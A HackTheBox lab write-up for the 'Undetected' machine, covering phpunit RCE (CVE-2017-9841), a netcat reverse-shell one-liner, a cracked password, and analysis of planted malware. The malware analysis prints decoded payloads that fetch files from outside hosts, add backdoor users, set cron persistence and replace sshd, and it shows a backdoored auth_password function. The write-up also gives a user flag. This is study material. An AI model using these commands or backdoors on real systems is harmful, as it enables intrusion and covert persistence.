# Undetected - HackTheBox - Writeup
Linux, 30 Base Points, Medium

![info.JPG](images/info.JPG)

## Machine

![‏‏Undetected.JPG](images/Undetected.JPG)
 
## TL;DR

To solve this machine, we begin by enumerating open services using ```namp``` – finding ports ```22``` and ```80```.

***User***: On ```/vendor``` found ```phpunit```, Using ```CVE-2017-9841``` to get RCE, Using that we get a reverse shell as ```www-data```, Found file ```/var/backups/info```, ```strings``` on this file shows base64 string which contains the hashed password of the new user was created, decrypt the hash and we get the password of ```steven1``` user.

***Root***: By reading the mails of ```steven``` we found a hint about the ```Apache``` service, Found an odd module on ```/lib/apache2/modules``` directory, ```strings``` on this module and we found base64 strings which show the attacker replaces ```/usr/sbin/sshd``` file, decompiling this file and we found the password on ```auth_password``` function (need to XOR it before) and we get the root password.

![pwn.JPG](images/pwn.JPG)


## Undetected Solution

### User

Let's start with ```nmap``` scanning:

```console
┌─[evyatar@parrot]─[/hackthebox/Undetected]
└──╼ $ nmap -sV -sC -oA nmap/Undetected 10.10.11.146
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-06 01:42 IDT
Nmap scan report for 10.10.11.146
Host is up (0.19s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Diana's Jewelry


```

By observing port 80 we get the following web page:

![port80.JPG](images/port80.JPG)


[Store](http://store.djewelry.htb/) button linked to [http://store.djewelry.htb/](http://store.djewelry.htb/).

Let's add ```store.djewelry.htb``` and ```djewelry.htb``` to  ```/etc/hosts/``` file ad click on [Store](http://store.djewelry.htb/) button:

![store.JPG](images/store.JPG)

By running ```gobuster``` we found the following:
```console
┌─[evyatar@parrot]─[/hackthebox/Undetected]
└──╼ $ gobuster dir -u http://djewelry.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100 -k --wildcard -s 403
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://djewelry.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/06 14:40:53 Starting gobuster in directory enumeration mode
===============================================================
....
/vendor                    (Status: 200) [Size: 15283]        
```

And by observing to [http://djewelry.htb/vendor](http://djewelry.htb/vendor) we can see:

![vendor.JPG](images/vendor.JPG)

After research we found that ```phpunit``` is vulenrable:

![phpunit.JPG](images/phpunit.JPG)

We can use the following exploit [https://www.exploit-db.com/exploits/50702](https://www.exploit-db.com/exploits/50702) (CVE-2017-9841):
```console
┌─[evyatar@parrot]─[/hackthebox/Undetected]
└──╼ $ python3 exp.py http://store.djewelry.htb
Vulnerable: http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

And we get RCE.

Let's run the following to get a reverse shell:
```console
> rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 4242 >/tmp/f
```

And we get a reverse shell:
```console
┌─[evyatar@parrot]─[/hackthebox/Undetected]
└──╼ $ nc -lvp 4242
listening on [any] 4242 ...
connect to [10.10.14.14] from store.djewelry.htb [10.10.11.146] 54046
/bin/sh: 0: can't access tty; job control turned off
$ 
```

By enumerating we found the following file owned by ```www-data```:
```console
$ ls -ltr /var/backups/info
-r-x------ 1 www-data www-data 27296 May 14  2021 /var/backups/info
```

Let's get this file and run ```strings``` on this file:
```console
┌─[evyatar@parrot]─[/hackthebox/Undetected]
└──╼ $ strings info 
/lib64/ld-linux-x86-64.so.2
tv5n
^X<h
klogctl
socket
exit
htons
perror
puts
fork
tolower
mmap
sched_setaffinity
strlen
unshare
memset
bind
getpagesize
vsnprintf
strtoul
setsockopt
getgid
stderr
system
getuid
execve
if_nametoindex
close
open
fprintf
sendto
sleep
__cxa_finalize
memmem
__libc_start_main
write
libc.so.6
GLIBC_2.3.4
GLIBC_2.4
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
[-] setsockopt(PACKET_VERSION)
[-] setsockopt(PACKET_RX_RING)
[-] socket(AF_PACKET)
[-] bind(AF_PACKET)
[-] sendto(SOCK_RAW)
[-] socket(SOCK_RAW)
[-] socket(SOCK_DGRAM)
[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER)
[-] klogctl(SYSLOG_ACTION_READ_ALL)
Freeing SMP
[-] substring '%s' not found in dmesg
ffff
/bin/bash
776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b
[-] fork()
/etc/shadow
[.] checking if we got root
[-] something went wrong =(
[+] got r00t ^_^
[-] unshare(CLONE_NEWUSER)
deny
/proc/self/setgroups
...
```

We can see the hex string, By decoding the [hex to ascii](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=Nzc2NzY1NzQyMDc0NjU2ZDcwNjY2OTZjNjU3MzJlNzg3OTdhMmY2MTc1NzQ2ODZmNzI2OTdhNjU2NDVmNmI2NTc5NzMyMDJkNGYyMDJmNzI2ZjZmNzQyZjJlNzM3MzY4MmY2MTc1NzQ2ODZmNzI2OTdhNjU2NDVmNmI2NTc5NzMzYjIwNzc2NzY1NzQyMDc0NjU2ZDcwNjY2OTZjNjU3MzJlNzg3OTdhMmYyZTZkNjE2OTZlMjAyZDRmMjAyZjc2NjE3MjJmNmM2OTYyMmYyZTZkNjE2OTZlM2IyMDYzNjg2ZDZmNjQyMDM3MzUzNTIwMmY3NjYxNzIyZjZjNjk2MjJmMmU2ZDYxNjk2ZTNiMjA2NTYzNjg2ZjIwMjIyYTIwMzMyMDJhMjAyYTIwMmEyMDcyNmY2Zjc0MjAyZjc2NjE3MjJmNmM2OTYyMmYyZTZkNjE2OTZlMjIyMDNlM2UyMDJmNjU3NDYzMmY2MzcyNmY2ZTc0NjE2MjNiMjA2MTc3NmIyMDJkNDYyMjNhMjIyMDI3MjQzNzIwM2QzZDIwMjIyZjYyNjk2ZTJmNjI2MTczNjgyMjIwMjYyNjIwMjQzMzIwM2UzZDIwMzEzMDMwMzAyMDdiNzM3OTczNzQ2NTZkMjgyMjY1NjM2ODZmMjAyMjI0MzEyMjMxM2E1YzI0MzY1YzI0N2E1MzM3Nzk2YjQ4NjY0NjRkNjczMzYxNTk2ODc0MzQ1YzI0MzE0OTU1NzI2ODVhNjE2ZTUyNzU0NDVhNjg2NjMxNmY0OTY0NmU2ZjRmNzY1ODZmNmY2YzRiNmQ2Yzc3NjI2YjY1Njc0MjU4NmIyZTU2NzQ0NzY3MzczODY1NGMzNzU3NDI0ZDM2NGY3MjRlNzQ0NzYyNWE3ODRiNDI3NDUwNzUzODU1NjY2ZDM5Njg0ZDMwNTIyZjQyNGM2NDQxNDM2ZjUxMzA1NDM5NmUyZjNhMzEzODM4MzEzMzNhMzAzYTM5MzkzOTM5MzkzYTM3M2EzYTNhMjAzZTNlMjAyZjY1NzQ2MzJmNzM2ODYxNjQ2Zjc3MjIyOTdkMjcyMDJmNjU3NDYzMmY3MDYxNzM3Mzc3NjQzYjIwNjE3NzZiMjAyZDQ2MjIzYTIyMjAyNzI0MzcyMDNkM2QyMDIyMmY2MjY5NmUyZjYyNjE3MzY4MjIyMDI2MjYyMDI0MzMyMDNlM2QyMDMxMzAzMDMwMjA3YjczNzk3Mzc0NjU2ZDI4MjI2NTYzNjg2ZjIwMjIyNDMxMjIyMDIyMjQzMzIyMjAyMjI0MzYyMjIwMjIyNDM3MjIyMDNlMjA3NTczNjU3MjczMmU3NDc4NzQyMjI5N2QyNzIwMmY2NTc0NjMyZjcwNjE3MzczNzc2NDNiMjA3NzY4Njk2YzY1MjA3MjY1NjE2NDIwMmQ3MjIwNzU3MzY1NzIyMDY3NzI2Zjc1NzAyMDY4NmY2ZDY1MjA3MzY4NjU2YzZjMjA1ZjNiMjA2NDZmMjA2NTYzNjg2ZjIwMjIyNDc1NzM2NTcyMjIzMTIyM2E3ODNhMjQ2NzcyNmY3NTcwM2EyNDY3NzI2Zjc1NzAzYTJjMmMyYzNhMjQ2ODZmNmQ2NTNhMjQ3MzY4NjU2YzZjMjIyMDNlM2UyMDJmNjU3NDYzMmY3MDYxNzM3Mzc3NjQzYjIwNjQ2ZjZlNjUyMDNjMjA3NTczNjU3MjczMmU3NDc4NzQzYjIwNzI2ZDIwNzU3MzY1NzI3MzJlNzQ3ODc0M2I) we get:
```console
wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo "* 3 * * * root /var/lib/.main" >> /etc/crontab; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd; while read -r user group home shell _; do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd; done < users.txt; rm users.txt;
```

We can see this is trying to add a new user with ```\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/``` as hashed password.

According to the strings on the files, we can guess it is the following exploit [https://www.exploit-db.com/exploits/47169](https://www.exploit-db.com/exploits/47169) which runs by ```www-data``` user.

Let's try to decrypt the hash (remove the ```\``` before ```$```):
```console
┌─[evyatar@parrot]─[/hackthebox/Undetected]
└──╼ $ cat hash
$6$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/
┌─[evyatar@parrot]─[/hackthebox/Undetected]
└──╼ $ john --wordlist=~/Desktop/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ihatehackers     (?)
1g 0:00:00:16 DONE (2022-05-06 17:07) 0.06134g/s 5465p/s 5465c/s 5465C/s littlebird..hairy
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

And we get password ```ihatehackers```.

Let's look on ```/etc/passwd```:
```console
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
steven:x:1000:1000:Steven Wright:/home/steven:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
steven1:x:1000:1000:,,,:/home/steven:/bin/bash
```

As we can see, we have users ```steven``` and ```steven1``` it looks odd.

Let's try to log in using the password ```ihatehackers``` to ```steven1``` user:
```console
┌─[evyatar@parrot]─[/hackthebox/Undetected]
└──╼ $ ssh steven1@10.10.11.146
steven1@10.10.11.146's password: 
steven@production:~$ whoami && hostname
steven
production
steven@production:~$ cat user.txt
31475dcf7fcf4c6b3a6d42252971152d

```

And we get the user flag ```31475dcf7fcf4c6b3a6d42252971152d```.

### Root

By reading the mails of ```steven``` user we get the following email:
```console
steven@production:~$ cat /var/mail/steven 
From root@production  Sun, 25 Jul 2021 10:31:12 GMT
Return-Path: <root@production>
Received: from production (localhost [127.0.0.1])
	by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847
	for <steven@production>; Sun, 25 Jul 2021 10:31:12 GMT
Received: (from root@localhost)
	by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;
	Sun, 25 Jul 2021 10:31:12 GMT
Date: Sun, 25 Jul 2021 10:31:12 GMT
Message-Id: <202107251031.80FAcdZ171847@production>
To: steven@production
From: root@production
Subject: Investigations

Hi Steven.

We recently updated the system but are still experiencing some strange behaviour with the Apache service.
We have temporarily moved the web store and database to another server whilst investigations are underway.
If for any reason you need access to the database or web application code, get in touch with Mark and he
will generate a temporary password for you to authenticate to the temporary server.

Thanks,
sysadmin
```

We can see the hint about the ```Apache``` service.

According to the mail, they updated the ```Apache```, Let's observe the modules:
```console
steven@production:/usr/lib/apache2/modules$ ls -ltr
total 8772
-rw-r--r-- 1 root root   34800 May 17  2021 mod_reader.so
-rw-r--r-- 1 root root 4625776 Nov 25 23:16 libphp7.4.so
-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_xml2enc.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_vhost_alias.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_usertrack.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_userdir.so
-rw-r--r-- 1 root root   14464 Jan  5 14:49 mod_unique_id.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_suexec.so
-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_substitute.so
-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_status.so
-rw-r--r-- 1 root root  248240 Jan  5 14:49 mod_ssl.so
-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_speling.so
-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_socache_shmcb.so
-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_socache_redis.so
-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_socache_memcache.so
-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_socache_dbm.so
-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_slotmem_shm.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_slotmem_plain.so
-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_setenvif.so
-rw-r--r-- 1 root root   22736 Jan  5 14:49 mod_session_dbd.so
-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_session_crypto.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_session_cookie.so
-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_session.so
-rw-r--r-- 1 root root   43216 Jan  5 14:49 mod_sed.so
-rw-r--r-- 1 root root   75984 Jan  5 14:49 mod_rewrite.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_request.so
-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_reqtimeout.so
-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_remoteip.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_reflector.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_ratelimit.so
-rw-r--r-- 1 root root   18560 Jan  5 14:49 mod_proxy_wstunnel.so
-rw-r--r-- 1 root root   22656 Jan  5 14:49 mod_proxy_uwsgi.so
-rw-r--r-- 1 root root   22768 Jan  5 14:49 mod_proxy_scgi.so
-rw-r--r-- 1 root root   67936 Jan  5 14:49 mod_proxy_http2.so
-rw-r--r-- 1 root root   47312 Jan  5 14:49 mod_proxy_http.so
-rw-r--r-- 1 root root   39152 Jan  5 14:49 mod_proxy_html.so
-rw-r--r-- 1 root root   35024 Jan  5 14:49 mod_proxy_hcheck.so
-rw-r--r-- 1 root root   47312 Jan  5 14:49 mod_proxy_ftp.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_proxy_fdpass.so
-rw-r--r-- 1 root root   35024 Jan  5 14:49 mod_proxy_fcgi.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_proxy_express.so
-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_proxy_connect.so
-rw-r--r-- 1 root root   59600 Jan  5 14:49 mod_proxy_balancer.so
-rw-r--r-- 1 root root   55504 Jan  5 14:49 mod_proxy_ajp.so
-rw-r--r-- 1 root root  133888 Jan  5 14:49 mod_proxy.so
-rw-r--r-- 1 root root   39120 Jan  5 14:49 mod_negotiation.so
-rw-r--r-- 1 root root   47312 Jan  5 14:49 mod_mpm_worker.so
-rw-r--r-- 1 root root   39120 Jan  5 14:49 mod_mpm_prefork.so
-rw-r--r-- 1 root root   67792 Jan  5 14:49 mod_mpm_event.so
-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_mime_magic.so
-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_mime.so
-rw-r--r-- 1 root root  260672 Jan  5 14:49 mod_md.so
-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_macro.so
-rw-r--r-- 1 root root  134544 Jan  5 14:49 mod_lua.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_log_forensic.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_log_debug.so
-rw-r--r-- 1 root root   84176 Jan  5 14:49 mod_ldap.so
-rw-r--r-- 1 root root   22736 Jan  5 14:49 mod_lbmethod_heartbeat.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_lbmethod_bytraffic.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_lbmethod_byrequests.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_lbmethod_bybusyness.so
-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_info.so
-rw-r--r-- 1 root root   55504 Jan  5 14:49 mod_include.so
-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_imagemap.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_ident.so
-rw-r--r-- 1 root root  253632 Jan  5 14:49 mod_http2.so
-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_heartmonitor.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_heartbeat.so
-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_headers.so
-rw-r--r-- 1 root root   22736 Jan  5 14:49 mod_filter.so
-rw-r--r-- 1 root root   14592 Jan  5 14:49 mod_file_cache.so
-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_ext_filter.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_expires.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_env.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_echo.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_dumpio.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_dir.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_dialup.so
-rw-r--r-- 1 root root   39120 Jan  5 14:49 mod_deflate.so
-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_dbd.so
-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_dav_lock.so
-rw-r--r-- 1 root root   59600 Jan  5 14:49 mod_dav_fs.so
-rw-r--r-- 1 root root  104656 Jan  5 14:49 mod_dav.so
-rw-r--r-- 1 root root   14464 Jan  5 14:49 mod_data.so
-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_charset_lite.so
-rw-r--r-- 1 root root   43216 Jan  5 14:49 mod_cgid.so
-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_cgi.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_cern_meta.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_case_filter_in.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_case_filter.so
-rw-r--r-- 1 root root   39152 Jan  5 14:49 mod_cache_socache.so
-rw-r--r-- 1 root root   39120 Jan  5 14:49 mod_cache_disk.so
-rw-r--r-- 1 root root   80176 Jan  5 14:49 mod_cache.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_buffer.so
-rw-r--r-- 1 root root   14464 Jan  5 14:49 mod_bucketeer.so
-rw-r--r-- 1 root root   22736 Jan  5 14:49 mod_brotli.so
-rw-r--r-- 1 root root   43216 Jan  5 14:49 mod_autoindex.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authz_user.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authz_owner.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authz_host.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authz_groupfile.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authz_dbm.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authz_dbd.so
-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_authz_core.so
-rw-r--r-- 1 root root   55528 Jan  5 14:49 mod_authnz_ldap.so
-rw-r--r-- 1 root root   35024 Jan  5 14:49 mod_authnz_fcgi.so
-rw-r--r-- 1 root root   22768 Jan  5 14:49 mod_authn_socache.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authn_file.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authn_dbm.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authn_dbd.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authn_core.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authn_anon.so
-rw-r--r-- 1 root root   35024 Jan  5 14:49 mod_auth_form.so
-rw-r--r-- 1 root root   39120 Jan  5 14:49 mod_auth_digest.so
-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_auth_basic.so
-rw-r--r-- 1 root root   14464 Jan  5 14:49 mod_asis.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_allowmethods.so
-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_alias.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_actions.so
-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_access_compat.so
-rw-r--r-- 1 root root   15925 Jan  5 14:49 httpd.exp
steven@production:/usr/lib/apache2/modules$ 
```

We can see the following module with different date:
```console
-rw-r--r-- 1 root root   34800 May 17  2021 mod_reader.so
```

By observing the ```strings``` of this file we can see the following:
```console
┌─[evyatar@parrot]─[/hackthebox/Undetected]
└──╼ $ strings mod_reader.so 
__gmon_start__
_ITM_deregisterTMCloneTable
_ITM_registerTMCloneTable
__cxa_finalize
ap_hook_handler
ap_hook_post_config
decodeblock
strncat
__stack_chk_fail
b64_decode
strchr
fork
execve
reader_module
libc.so.6
mod_reader.so
GLIBC_2.2.5
GLIBC_2.4
u/UH
AUATUSH
<=tlH
[]A\A]
D$(1
D$(dH+
reader
/bin/bash
mod_reader.c
d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk
;*3$"
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
42PA
GCC: (Debian 10.2.1-6) 10.2.1 20210110
w#%	
...
```

As we can see we have an base64 string ```d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk``` which looks odd.

By decoding this base64 we get:
```console
wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd
```

Meaning that wget saved file called ```/usr/sbin/sshd``` and modified the date according ```/usr/sbin/a2enmod``` file.

The ```sshd``` process is started when the system boots. The program is usually located at ```/usr/sbin/sshd```. It runs as root. The initial process acts as the master server that listens to incoming connections. Generally, this process is the one with the lowest process id or the one that has been running the longest. It is also the parent process of all the other ```sshd``` processes. The following command can be used to display the process tree on Linux, and it is easy to see which one is the parent process ([Reference](https://www.ssh.com/academy/ssh/sshd)).

Usually, to inject code into ```sshd``` process we inject it into ```auth_password``` ([Example](https://jm33.me/sshd-injection-and-password-harvesting.html)).

Let's decompile the modified ```sshd``` using [Ghidra](https://github.com/NationalSecurityAgency/ghidra) and look on ```auth_password``` function:
```c

/* WARNING: Could not reconcile some variable overlaps */

int auth_password(ssh *ssh,char *password)
{
  Authctxt *ctxt;
  passwd *ppVar1;
  int iVar2;
  uint uVar3;
  byte *pbVar4;
  byte *pbVar5;
  size_t sVar6;
  byte bVar7;
  int iVar8;
  long in_FS_OFFSET;
  char backdoor [31];
  byte local_39 [9];
  long local_30;
  
  bVar7 = 0xd6;
  ctxt = (Authctxt *)ssh->authctxt;
  local_30 = *(long *)(in_FS_OFFSET + 0x28);
  backdoor._28_2_ = 0xa9f4;
  ppVar1 = ctxt->pw;
  iVar8 = ctxt->valid;
  backdoor._24_4_ = 0xbcf0b5e3;
  backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
  backdoor[30] = -0x5b;
  backdoor._0_4_ = 0xf0e7abd6;
  backdoor._4_4_ = 0xa4b3a3f3;
  backdoor._8_4_ = 0xf7bbfdc8;
  backdoor._12_4_ = 0xfdb3d6e7;
  pbVar4 = (byte *)backdoor;
  while( true ) {
    pbVar5 = pbVar4 + 1;
    *pbVar4 = bVar7 ^ 0x96;
    if (pbVar5 == local_39) break;
    bVar7 = *pbVar5;
    pbVar4 = pbVar5;
  }
  iVar2 = strcmp(password,backdoor);
  uVar3 = 1;
  if (iVar2 != 0) {
    sVar6 = strlen(password);
    uVar3 = 0;
    if (sVar6 < 0x401) {
      if ((ppVar1->pw_uid == 0) && (options.permit_root_login != 3)) {
        iVar8 = 0;
      }
      if ((*password != '\0') ||
         (uVar3 = options.permit_empty_passwd, options.permit_empty_passwd != 0)) {
        if (auth_password::expire_checked == 0) {
          auth_password::expire_checked = 1;
          iVar2 = auth_shadow_pwexpired(ctxt);
          if (iVar2 != 0) {
            ctxt->force_pwchange = 1;
          }
        }
        iVar2 = sys_auth_passwd(ssh,password);
        if (ctxt->force_pwchange != 0) {
          auth_restrict_session(ssh);
        }
        uVar3 = (uint)(iVar2 != 0 && iVar8 != 0);
      }
    }
  }
  if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) {
    return (int)uVar3;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

